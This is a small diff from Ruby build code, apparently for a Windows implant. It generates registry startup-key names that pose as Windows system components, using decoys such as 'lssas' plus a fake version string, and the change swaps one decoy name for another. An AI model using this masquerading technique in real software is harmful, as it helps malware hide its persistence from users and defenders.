@@ -374,7 +374,7 @@ class BuildWindows < Build
   def reg_start_key(seed)
     fakever = (seed[2].ord % 11).to_s + "." + seed.slice(0..2).unpack('S').first.to_s
 
-    fake_names = ['wmiprvse', 'lssas', 'dllhost', 'winlogon', 'svchost', 'MSInst', 'WinIME',
+    fake_names = ['wmiprvse', 'lssas', 'dllhost', 'IconStor', 'svchost', 'MSInst', 'WinIME',
                   'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
                   'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
     fake_names[seed.ord % fake_names.size] + " " + fakever
